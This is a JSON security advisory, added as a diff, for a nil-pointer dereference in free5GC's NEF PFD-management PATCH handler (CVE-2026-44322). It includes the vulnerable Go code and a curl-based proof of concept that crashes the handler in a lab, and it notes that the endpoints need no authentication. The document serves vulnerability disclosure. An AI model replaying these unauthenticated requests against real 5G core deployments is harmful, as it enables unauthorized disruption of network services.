@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-j59f-x285-69jx",
+  "modified": "2026-05-08T23:03:44.009614Z",
+  "published": "2026-05-08T22:50:57Z",
+  "aliases": [
+    "CVE-2026-44322"
+  ],
+  "summary": "free5GC's NEF 3gpp-pfd-management PATCH applications/{appId} panics on UDR access failure due to nil ProblemDetails dereference",
+  "details": "### Summary\nfree5GC's NEF `PATCH /3gpp-pfd-management/v1/{afId}/transactions/{transId}/applications/{appId}` handler panics with a nil-pointer dereference when the upstream UDR call fails AND the consumer wrapper returns `err != nil` together with a nil `*ProblemDetails`. The handler's `errPfdData != nil` branch builds its own `problemDetailsErr` correctly, but immediately after it reads `problemDetails.Cause` (the OTHER value, which is nil in this branch) and panics. Gin recovery converts the panic into `HTTP 500`, so a single PATCH against this endpoint returns 500 instead of the intended controlled error response whenever UDR access is failing.\n\nThis is a second-order bug: the trigger requires UDR access to be failing (e.g. NRF or UDR is unreachable, registration broken, transient network failure). The attacker does not directly control that condition, so this is scored as AC:H. Once the upstream condition exists, the trigger is a single PATCH request and is repeatable.\n\nThe HTTP request itself in v4.2.1 is reachable without an `Authorization` header because the underlying NEF `3gpp-pfd-management` route group is mounted without inbound auth middleware (see free5gc/free5gc#858). So in the validation lab the entire trigger chain is unauthenticated end-to-end.\n\n### Details\nValidated against the NEF container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- Running Docker image: `free5gc/nef:v4.2.1`\n- Runtime NEF commit: `5ce35eab`\n- Docker validation date: 2026-03-21 (container log timestamp `2026-03-21T03:06:36Z`)\n- NEF endpoint: `http://10.100.200.19:8000`\n\nVulnerable handler logic in `PatchIndividualApplicationPFDManagement` (paraphrased):\n```go\npdfData, problemDetails, errPfdData := p.Consumer().AppDataPfdsAppIdGet(appID)\n\nswitch {\ncase problemDetails != nil:\n    ...\ncase errPfdData != nil:\n    problemDetailsErr := \u0026models.ProblemDetails{\n        Status: http.StatusInternalServerError,\n        Detail: \"Query to UDR failed\",\n    }\n    c.Set(sbi.IN_PB_DETAILS_CTX_STR, problemDetails.Cause)   // \u003c-- nil deref\n    c.JSON(int(problemDetailsErr.Status), problemDetailsErr)\n    return\n}\n```\nIn the `errPfdData != nil` branch, `problemDetails` is by construction nil (otherwise the first `case` would have matched). Reading `problemDetails.Cause` panics with `runtime error: invalid memory address or nil pointer dereference`. The intended value is presumably `problemDetailsErr.Cause` -- the locally constructed problem-details struct.\n\nCode evidence (paths in `free5gc/nef`):\n- Patch handler core path:\n  - `NFs/nef/internal/sbi/processor/pfd.go:563`\n  - `NFs/nef/internal/sbi/processor/pfd.go:610`\n- Panic site (nil-deref on `problemDetails.Cause`):\n  - `NFs/nef/internal/sbi/processor/pfd.go:622`\n- Route exposure / dispatch:\n  - `NFs/nef/internal/sbi/api_pfd.go:168`\n  - `NFs/nef/internal/sbi/api_pfd.go:188`\n\n### PoC\nReproduced end-to-end against the running NEF at `http://10.100.200.19:8000`. The trigger requires UDR access to be failing -- the lab simulates this by stopping NRF (so NEF's UDR client fails to discover/dial UDR). In production, equivalent triggers include NRF outages, UDR outages, or transient network failures.\n\n1. Create an AF context (no Authorization header):\n```\ncurl -i -X POST 'http://10.100.200.19:8000/3gpp-traffic-influence/v1/afnpd3/subscriptions' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"afAppId\":\"app-nef-npd3\",\"anyUeInd\":true}'\n```\n\n2. Create a PFD-management transaction:\n```\ncurl -i -X POST 'http://10.100.200.19:8000/3gpp-pfd-management/v1/afnpd3/transactions' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"pfdDatas\":{\"appnpd3\":{\"externalAppId\":\"appnpd3\",\"pfds\":{\"pfd1\":{\"pfdId\":\"pfd1\",\"flowDescriptions\":[\"permit in ip from 10.68.28.39 80 to any\"]}}}}}'\n```\n\n3. Make UDR access fail (lab simulation):\n```\ndocker stop nrf\n```\n\n4. Trigger the panic with one PATCH:\n```\ncurl -i -X PATCH 'http://10.100.200.19:8000/3gpp-pfd-management/v1/afnpd3/transactions/1/applications/appnpd3' \\\n  -H 'Content-Type: application/json' \\\n  --data '{\"externalAppId\":\"appnpd3\",\"pfds\":{\"pfd1\":{\"pfdId\":\"pfd1\",\"flowDescriptions\":[]}}}'\n```\n```\nHTTP/1.1 500 Internal Server Error\nContent-Length: 0\n```\n\n5. NEF container logs (`docker logs --since 2026-03-21T03:06:36Z nef`) confirm the nil-deref panic at `pfd.go:622` inside `PatchIndividualApplicationPFDManagement`:\n```\n[INFO][NEF][PFDMng] PatchIndividualApplicationPFDManagement - scsAsID[afnpd3], transID[1], appID[appnpd3]\n[ERRO][NEF][GIN] panic: runtime error: invalid memory address or nil pointer dereference\ngithub.com/free5gc/nef/internal/sbi/processor.(*Processor).PatchIndividualApplicationPFDManagement\n    .../pfd.go:622\ngithub.com/free5gc/nef/internal/sbi.(*Server).apiPatchIndividualApplicationPFDManagement\n    .../api_pfd.go:188\n[INFO][NEF][GIN] | 500 | PATCH | /3gpp-pfd-management/v1/afnpd3/transactions/1/applications/appnpd3 |\n```\n\n6. Restore for further testing:\n```\ndocker start nrf\n```\n\n### Impact\nNULL pointer dereference (CWE-476) caused by improper handling of an exceptional branch (CWE-754): the `errPfdData != nil` branch reads `problemDetails.Cause` even though `problemDetails` is nil by construction in that branch (the prior `case` already matched the non-nil case). The intended target was the locally constructed `problemDetailsErr.Cause`.\n\nGin recovery catches the panic, so the NEF process is NOT killed and other endpoints continue serving. The realized impact is per-request: PATCH against this endpoint returns `500` (with empty body and a stack trace in NEF logs) instead of the intended controlled UDR-failure response, whenever upstream UDR access is failing.\n\nNo Confidentiality impact (the response is `500` with empty body). No persistent Integrity impact (the panic happens before any state mutation). Availability impact is limited to per-request degradation and only fires while UDR access is independently broken; the attacker does not directly control that precondition, so AC:H is the honest assessment.\n\nAffected: free5gc v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/925\nUpstream fix: https://github.com/free5gc/nef/pull/22",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/nef",
+        "purl": "pkg:golang/github.com/free5gc/nef"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.2.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-j59f-x285-69jx/GHSA-j59f-x285-69jx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-j59f-x285-69jx"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/925"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/nef/pull/22"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/nef/commit/72a47f3fab4dffbd227f8d92c5f69dca93b610cb"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
